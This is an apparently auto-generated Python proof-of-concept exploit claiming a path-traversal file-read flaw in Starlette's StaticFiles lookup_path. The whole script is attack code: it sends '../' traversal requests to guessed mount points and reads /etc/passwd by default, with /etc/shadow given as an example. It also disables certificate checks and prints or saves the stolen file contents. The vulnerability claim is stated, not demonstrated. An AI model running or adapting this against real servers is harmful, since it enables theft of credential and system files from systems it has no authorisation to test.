#!/usr/bin/env python3
# PoC for starlette (/home/xcy/.local/lib/python3.14/site-packages/starlette)
# Path: suspicious-000
# Sink: lookup_path
# Auto-generated — run with: python3 lfi_lookup_function_staticfiles_lookup_path.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Starlette StaticFiles path traversal (LFI).
Vulnerability: lookup_path() in staticfiles.py does not sanitize '../' sequences.
Impact: Arbitrary file read outside the intended static directories.
"""

import argparse
import sys
import urllib.request
import urllib.error
import ssl

def exploit(target_url, file_to_read="/etc/passwd"):
    """
    Attempt to read an arbitrary file via path traversal.
    
    Args:
        target_url: Base URL of the Starlette application (e.g., http://localhost:8000)
        file_to_read: Absolute path of the file to read (default: /etc/passwd)
    
    Returns:
        Response content as string if successful, None otherwise.
    """
    # Construct the traversal payload
    # We need to go up enough directories to reach root, then append the target file
    # The number of '../' depends on how deep the static directory is mounted.
    # We'll try a common pattern: ../../../../../
    traversal_prefix = "../../../../../../"
    payload_path = traversal_prefix + file_to_read.lstrip("/")
    
    # Build the full URL - assuming static files are served at /static/ or root
    # Try common static file mount points
    urls_to_try = [
        f"{target_url.rstrip('/')}/static/{payload_path}",
        f"{target_url.rstrip('/')}/{payload_path}",
        f"{target_url.rstrip('/')}/files/{payload_path}",
    ]
    
    # Disable SSL verification for testing (common in PoCs)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    
    for url in urls_to_try:
        try:
            print(f"[*] Trying: {url}")
            req = urllib.request.Request(url, method="GET")
            with urllib.request.urlopen(req, context=ctx, timeout=10) as response:
                content = response.read().decode("utf-8", errors="replace")
                if content and len(content) > 0:
                    print(f"[+] Success! Retrieved {len(content)} bytes from {file_to_read}")
                    return content
        except urllib.error.HTTPError as e:
            print(f"[-] HTTP {e.code}: {e.reason}")
        except urllib.error.URLError as e:
            print(f"[-] URL error: {e.reason}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    print("[-] Failed to read file with any URL pattern")
    return None

def main():
    parser = argparse.ArgumentParser(
        description="Starlette StaticFiles Path Traversal PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Example:
  python3 poc.py http://localhost:8000
  python3 poc.py http://localhost:8000 --file /etc/shadow
        """
    )
    parser.add_argument("target", help="Target URL (e.g., http://localhost:8000)")
    parser.add_argument("--file", default="/etc/passwd",
                        help="File to read (default: /etc/passwd)")
    parser.add_argument("--output", "-o", help="Save output to file")
    
    args = parser.parse_args()
    
    print(f"[*] Starlette Path Traversal PoC")
    print(f"[*] Target: {args.target}")
    print(f"[*] File to read: {args.file}")
    print()
    
    content = exploit(args.target, args.file)
    
    if content:
        print("\n[*] File contents:")
        print("-" * 50)
        print(content)
        print("-" * 50)
        
        if args.output:
            with open(args.output, "w") as f:
                f.write(content)
            print(f"[+] Saved to {args.output}")
    else:
        print("\n[-] Exploit failed")
        sys.exit(1)

if __name__ == "__main__":
    main()
